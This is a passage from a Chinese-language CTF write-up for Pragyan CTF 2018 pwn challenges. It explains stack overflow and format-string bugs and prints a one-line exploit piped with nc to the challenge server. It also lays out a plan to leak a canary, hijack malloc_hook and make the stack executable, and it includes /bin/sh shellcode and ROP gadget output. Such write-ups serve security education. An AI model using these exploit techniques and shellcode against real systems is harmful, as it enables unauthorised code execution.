?</span><br><span class="line">-0000000000000010 anonymous_3     dd ?</span><br><span class="line">-000000000000000C anonymous_4     db ?</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>s1需填充0x10即16个字节，v8填充36个字节。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;8&quot;&apos;|nc 128.199.224.175 13000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;8&quot;&apos;|nc 128.199.224.175 13000</span><br><span class="line"></span><br><span class="line">Enter password to authentic yourself : Enter case number: </span><br><span class="line"></span><br><span class="line"> 1) Application_1</span><br><span class="line"> 2) Application_2</span><br><span class="line"> 3) Application_3</span><br><span class="line"> 4) Application_4</span><br><span class="line"> 5) Application_5</span><br><span class="line"> 6) Application_6</span><br><span class="line"> 7) Flag</span><br><span class="line"></span><br><span class="line"> Enter choice :- </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">The flag is :- pctf&#123;bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC&#125;</span><br><span class="line">r�</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure><h1 id="Unbreakable-encryption-350pts"><a href="#Unbreakable-encryption-350pts" class="headerlink" title="Unbreakable encryption (350pts)"></a>Unbreakable encryption (350pts)</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Your friend, Liara, has encrypted all her life secrets, using the one of the best encryptions available in the world, the AES. She has challenged you that no matter what, you can never read her life secrets.</span><br><span class="line"></span><br><span class="line">The encryption service is running at :- 128.199.224.175:33000</span><br><span class="line">The binary file is named aes_enc.</span><br><span class="line"></span><br><span class="line">Her encrypted life secrets are as follows :-</span><br><span class="line"></span><br><span class="line">0000 - 40 87 68 1a b0 23 73 c4 61 44 b4 c0 21 f1 63 0b @.h..#s.aD..!.c.</span><br><span class="line">0010 - 73 e9 0d 38 e4 bd d8 33 41 64 2c 43 85 d4 54 0e s..8...3Ad,C..T.</span><br><span class="line">0020 - f5 bc 8c 02 db ee 0d e8 d6 29 81 3a 5f cb 63 bd .........).:_.c.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: Since some teams were having issues with the buffering of the I/O streams when executing the binary remotely, we have updated the binary file, to flush the output streams properly. The modified binary is named aes_enc_unbf, and will be running on 128.199.224.175:33100</span><br></pre></td></tr></table></figure><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption</a></p><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>pwn题中，有形如下述代码的形式就是格式化字符串漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure></p><p>也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。<br>示例程序如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译：<code>gcc -m32 -o str str.c</code><br>输入：<code>%2$x</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142756.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142805.jpg" alt=""><br>原因是如果直接printf(“占位符”)这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。</p><h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>事实上，我们在scanf(或者read)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出<code>addr(4字节)%6$s</code>，就能读取这个地址的值了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142854.jpg" alt=""><br>我们尝试一下，输入<code>AAAA%6$s</code>，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142934.jpg" alt=""></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，%n。<br>这个占位符可以把它前面输出的字符的数量，写入指定的地址。<br>比如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"abc%n"</span>, &amp;val);</span><br></pre></td></tr></table></figure></p><p>val的值就被改变为3。</p><h3 id="64位格式化字符串"><a href="#64位格式化字符串" class="headerlink" title="64位格式化字符串"></a>64位格式化字符串</h3><p>下述示例来源于RE4B。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d</span></span><br><span class="line"><span class="string">"</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>linux上优先使用RDI，RSI，RDX，RCX，R8，R9寄存器传递前6个参数，然后利用栈传递其余参数。<br>汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">    .string &quot;a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">    sub     rsp, 40</span><br><span class="line"></span><br><span class="line">    mov     r9d, 5 #第6个参数</span><br><span class="line">    mov     r8d, 4 #第5个参数</span><br><span class="line">    mov     ecx, 3 #第4参数</span><br><span class="line">    mov     edx, 2 #第3个参数</span><br><span class="line">    mov     esi, 1 #第2个参数</span><br><span class="line">    mov     edi, OFFSET FLAT:.LC0 #第1个参数</span><br><span class="line">    xor     eax, eax ; number of vector registers passed</span><br><span class="line">    mov     DWORD PTR [rsp+16], 8 #第9个参数</span><br><span class="line">    mov     DWORD PTR [rsp+8], 7 #第8个参数</span><br><span class="line">    mov     DWORD PTR [rsp], 6 #第7个参数</span><br><span class="line">    call    printf</span><br><span class="line"></span><br><span class="line">    ; return 0</span><br><span class="line"></span><br><span class="line">    xor     eax, eax</span><br><span class="line">    add     rsp, 40</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></p><p>所以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers</span><br><span class="line">rax     0x0     0</span><br><span class="line">rbx     0x0     0</span><br><span class="line">rcx     0x3     3</span><br><span class="line">rdx     0x2     2</span><br><span class="line">rsi     0x1     1</span><br><span class="line">rdi     0x400628 4195880</span><br><span class="line">rbp     0x7fffffffdf60 0x7fffffffdf60</span><br><span class="line">rsp     0x7fffffffdf38 0x7fffffffdf38</span><br><span class="line">r8      0x4     4</span><br><span class="line">r9      0x5     5</span><br><span class="line">r10     0x7fffffffdce0 140737488346336</span><br><span class="line">r11     0x7ffff7a65f60 140737348263776</span><br><span class="line">r12     0x400440 4195392</span><br><span class="line">r13     0x7fffffffe040 140737488347200</span><br><span class="line">r14     0x0     0</span><br><span class="line">r15     0x0     0</span><br><span class="line">rip     0x7ffff7a65f60 0x7ffff7a65f60 &lt;__printf&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10g $rsp</span><br><span class="line">0x7fffffffdf38: 0x0000000000400576 -&gt; 返回地址 0x0000000000000006</span><br><span class="line">0x7fffffffdf48: 0x0000000000000007 0x00007fff00000008</span><br><span class="line">0x7fffffffdf58: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7fffffffdf68: 0x00007ffff7a33de5 0x0000000000000000</span><br><span class="line">0x7fffffffdf78: 0x00007fffffffe048 0x0000000100000000</span><br></pre></td></tr></table></figure><p><strong>所以在64位格式化字符串漏洞利用时，要注意如何计算偏移，因为即使没有占位符，我们依然是按照这个传参规则来读取变量的。</strong></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">fmtstr</a></h4><p>上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,pwntools有自动化代码可以得到这个偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure></p><h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p>生成任意地址写的payload的函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;key: value&#125;)</span><br></pre></td></tr></table></figure></p><p>fmtstr_payload有两个参数</p><ul><li>第一个参数是int，用于表示取参数的偏移个数</li><li>第二个参数是字典，字典的意义是往key的地址，写入value的值</li></ul><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ checksec aes_enc_unbf </span><br><span class="line">[*] &apos;/home/sakura/unbreakable_encryption/aes_enc_unbf&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ldd aes_enc_unbf </span><br><span class="line">not a dynamic executable</span><br></pre></td></tr></table></figure><h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ./aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - b2 c4 08 6e 77 66 cb 59-b3 6a 4a 8b ed 35 98 05   ...nwf.Y.jJ..5..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">sakura</span><br></pre></td></tr></table></figure><p>读取输入并打印，并将其传递给encrypt，加载aes文件，加密消息并将其输出到屏幕。<br>然后它调用decrypt解密，并将明文输出到屏幕上。</p><h3 id="栈溢出-1"><a href="#栈溢出-1" class="headerlink" title="栈溢出"></a>栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5); <span class="comment">//bug</span></span><br></pre></td></tr></table></figure><p>scanf处存在栈溢出，上一个题的前置知识已经说过了。<br>不过这个题因为有canary，所以不能用来直接getshell，我们要想其他方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ./aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - d5 55 d2 b4 58 fb d3 04-16 cd 58 fb 63 0f ea 16   .U..X.....X.c...</span><br><span class="line">0010 - 9f ce d0 d3 0a 9a 15 c8-ab aa 76 69 00 18 78 1b   ..........vi..x.</span><br><span class="line">0020 - e6 1d c0 01 bf 44 f1 e5-dc 22 ba 2a ae d2 e3 f4   .....D...&quot;.*....</span><br><span class="line">0030 - 39 7b fb f1 fb 99 79 b7-b9 16 f7 37 3d a1 4c 38   9&#123;....y....7=.L8</span><br><span class="line">0040 - 16 75 9d b2 23 60 0a a2-91 12 7c 22 e2 8e 90 83   .u..#`....|&quot;....</span><br><span class="line">0050 - b1 60 46 2d 7b e3 18 12-65 62 85 db e5 95 fe 1f   .`F-&#123;...eb......</span><br><span class="line">0060 - b2 11 7e 38 43 05 4f d2-28 84 5a c7 39 2c 06 41   ..~8C.O.(.Z.9,.A</span><br><span class="line">0070 - f1 ee 61 c6 1c b6 e7 52-b3 fd 8c 30 16 bb 6c 38   ..a....R...0..l8</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: ./aes_enc_unbf terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure></p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nYour message is :- "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;v5);<span class="comment">//bug</span></span><br></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为静态链接，所以不能改写GOT表，考虑使用malloc_hook来解题，可以参考0ctf的easiestprintf。<br>其次因为有canary，所以要先leak出canary。<br>所以总的思路就出来了：</p><ol><li>通过格式化字符串的任意地址读写leak出canary的值，并劫持malloc_hook，使其指向main函数。<br>这样当执行malloc的时候，就会跳回main函数，然后重新执行程序。</li><li>然后我们修改_stack_prot的值为0x7，之后再次跳回main函数。</li><li>最后将malloc_hook的值还原为0，不再跳回main函数，然后因为之前已经leak出了canary的值，就可以触发栈溢出，将返回地址设置为_dl_make_stack_executable，并传入参数_libc_stack_end，因为之前_stack_prot的值已经被设置为0x7，这个函数将会使得栈可执行，取消NX保护，最后跳回我们预先写好的shellcode就可以getshell了。<h3 id="准备shellcode"><a href="#准备shellcode" class="headerlink" title="准备shellcode"></a>准备shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x1000:xoreax, eax</span><br><span class="line">0x1002:pusheax</span><br><span class="line">0x1003:push0x68732f2f</span><br><span class="line">0x1008:push0x6e69622f</span><br><span class="line">0x100d:pusheax</span><br><span class="line">0x100e:pusheax</span><br><span class="line">0x100f:popecx</span><br><span class="line">0x1010:popedx</span><br><span class="line">0x1011:movebx, esp</span><br><span class="line">0x1013:push0x5b</span><br><span class="line">0x1015:popeax</span><br><span class="line">0x1016:xoral, 0x50</span><br><span class="line">0x1018:int0x80</span><br><span class="line">0x101a:</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x50\x50\x59\x5A\x89\xE3\x6A\x5B\x58\x34\x50\xCD\x80</span><br></pre></td></tr></table></figure><h3 id="准备参数"><a href="#准备参数" class="headerlink" title="准备参数"></a>准备参数</h3><ul><li>dl_make_stack_executable<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __usercall dl_make_stack_executable@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != _libc_stack_end )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v1 = a1;</span><br><span class="line">  result = mprotect(*a1 &amp; -dl_pagesize, dl_pagesize, _stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> __readgsdword(<span class="number">0xFFFFFFE8</span>);</span><br><span class="line">  *v1 = <span class="number">0</span>;</span><br><span class="line">  dl_stack_flags |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>参数a1应该为_libc_stack_end的地址了。_stack_prot通过rop修改为0x7即111b，这样的话stack就是可执行的了，然后就可以执行shellcode了。<br>直接search。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033250.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_libc_stack_end = 0x0822ECE8</span><br><span class="line">__stack_prot = 0x0822EC98</span><br><span class="line">_dl_make_stack_executable = 0x081715D0</span><br></pre></td></tr></table></figure></p><ul><li>malloc_hook<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033601.png" alt=""></li><li><p>main<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-041310.png" alt=""></p></li><li><p>pop_eax</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;pop|ret&quot;|grep eax</span><br><span class="line">0x0813ed14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0817b0ea : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804c906 : pop 